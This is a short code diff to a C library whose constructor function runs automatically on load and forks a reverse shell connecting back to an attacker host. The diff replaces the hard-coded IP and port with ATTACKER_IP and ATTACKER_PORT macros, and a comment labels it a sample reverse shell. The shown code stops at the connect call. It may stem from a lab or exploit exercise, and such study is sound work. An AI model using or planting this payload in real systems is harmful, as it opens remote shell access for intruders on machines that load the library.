@@ -8,6 +8,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define ATTACKER_IP "192.168.1.127"
+#define ATTACKER_PORT 5555
 
 __attribute__((constructor))
 static void init()
@@ -18,13 +20,13 @@ static void init()
     //Just a sample reverse shell (https://www.revshells.com/)
     pid_t pid = fork();
     if(pid==0){
-        int port = 5555;
+        int port = ATTACKER_PORT;
         struct sockaddr_in revsockaddr;
 
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
         revsockaddr.sin_family = AF_INET;       
         revsockaddr.sin_port = htons(port);
-        revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.119");
+        revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
 
         connect(sockt, (struct sockaddr *) &revsockaddr, 
         sizeof(revsockaddr));
